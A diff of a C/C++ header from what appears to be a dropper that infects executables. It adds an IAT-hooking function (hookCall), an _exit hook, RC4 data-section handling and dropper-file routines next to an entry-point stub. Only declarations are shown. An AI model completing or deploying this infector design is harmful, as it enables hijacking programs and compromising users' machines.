@@ -131,12 +131,13 @@ extern BYTE oepStub[OEPSTUBSIZE];
 // MSVCRT.dll
 #define CALL_SPRINTF					30
 #define CALL_EXIT						31
+#define CALL__EXIT						32
 
 // ADVAPI32.DLL
-#define CALL_GETCURRENTHWPROFILE		32
+#define CALL_GETCURRENTHWPROFILE		33
 
 // #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
-#define STRING(idx) strings + stringsOffsets[(idx)]
+#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])
 #define STRLEN(idx) _STRLEN_(STRING(idx))
 
 // RC4
@@ -203,6 +204,7 @@ typedef ALIGN4 struct _data_section_header {
 	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
 	int exitProcessIndex;
 	int exitIndex;
+	int _exitIndex;
 	
 	// out own functions
 	struct {
@@ -213,7 +215,7 @@ typedef ALIGN4 struct _data_section_header {
 		DataSectionBlob exitHook;
 		DataSectionBlob rvaToOffset;
 		DataSectionBlob rc4;
-		DataSectionBlob destroyWindowHook;
+		DataSectionBlob hookCall;
 	} functions;
 	
 	// strings
@@ -377,6 +379,8 @@ typedef SIZE_T (WINAPI *VIRTUALQUERY)(
 
 typedef void (__cdecl *EXIT)(int status);
 
+typedef void (__cdecl *_EXIT)(int status);
+
 typedef BOOL (*VERIFYVERSIONINFO) (
 							  OSVERSIONINFOEX* lpVersionInfo,
 							  DWORD dwTypeMask,
@@ -393,6 +397,13 @@ typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);
 
 typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
 						 unsigned char *data, size_t data_len, DataSectionHeader *header);
+
+typedef DWORD (*HOOKCALL)(char* dll, 
+				 int index, 
+				 DWORD hookFunc, 
+				 UINT_PTR IAT_rva, 
+				 DWORD imageBase, 
+				 DataSectionHeader *header); 
 
 #pragma endregion
 
@@ -435,12 +446,15 @@ FUNCTION_END_DECL(CoreThreadProc);
 VOID WINAPI ExitProcessHook(UINT uExitCode);
 FUNCTION_END_DECL(ExitProcessHook);
 
-__declspec(noreturn) VOID __cdecl ExitHook(int status);
+__declspec(noreturn) void __cdecl ExitHook(int status);
 FUNCTION_END_DECL(ExitHook);
 
 void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
 			  unsigned char *data, size_t data_len, DataSectionHeader *header);
 FUNCTION_END_DECL(rc4_skip);
+
+DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header); 
+FUNCTION_END_DECL(hookCall);
 
 void generate_key(std::string& key, unsigned int length);
 bool dumpDropperFiles();
